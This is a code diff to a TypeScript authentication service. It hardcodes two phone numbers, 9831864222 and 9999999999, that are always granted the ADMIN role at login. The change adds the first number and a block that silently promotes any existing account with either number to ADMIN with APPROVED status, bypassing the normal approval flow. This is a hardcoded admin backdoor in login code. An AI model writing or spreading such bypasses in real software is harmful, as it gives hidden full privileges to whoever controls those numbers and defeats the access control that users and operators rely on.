@@ -201,8 +201,9 @@ export class AuthService {
       },
     });
 
-    // Force 9999999999 to ALWAYS be an Admin
-    if (cleanPhone === '9999999999') {
+    // Force 9831864222 and 9999999999 to ALWAYS be an Admin with APPROVED status
+    const isAdminBypassPhone = cleanPhone === '9831864222' || cleanPhone === '9999999999';
+    if (isAdminBypassPhone) {
       suggestedRole = Role.ADMIN;
     }
 
@@ -211,11 +212,32 @@ export class AuthService {
       suggestedRole = Role.SELLER;
     }
 
-    if (
+    if (user && isAdminBypassPhone && (user.role !== Role.ADMIN || user.status !== UserStatus.APPROVED)) {
+      user = await this.prisma.user.update({
+        where: { id: user.id },
+        data: { role: Role.ADMIN, status: UserStatus.APPROVED },
+        select: {
+          id: true,
+          phone: true,
+          email: true,
+          role: true,
+          status: true,
+          adminProfile: {
+            select: {
+              id: true,
+              displayName: true,
+              department: true,
+              permissions: true,
+            },
+          },
+        },
+      });
+      this.logger.log(`Super Admin ${user.phone} role and status verified upon login`);
+    } else if (
       user &&
       suggestedRole &&
       user.role !== suggestedRole &&
-      (suggestedRole !== Role.ADMIN || cleanPhone === '9999999999')
+      (suggestedRole !== Role.ADMIN || isAdminBypassPhone)
     ) {
       // User exists but has a different role (e.g. BUYER logging into SELLER app)
       // Update the user's role so the new token allows access to the requested app
@@ -242,6 +264,7 @@ export class AuthService {
         `User ${user.id} role updated from previous role to ${suggestedRole} upon login`,
       );
     }
+
 
     if (!user) {
       isNewUser = true;
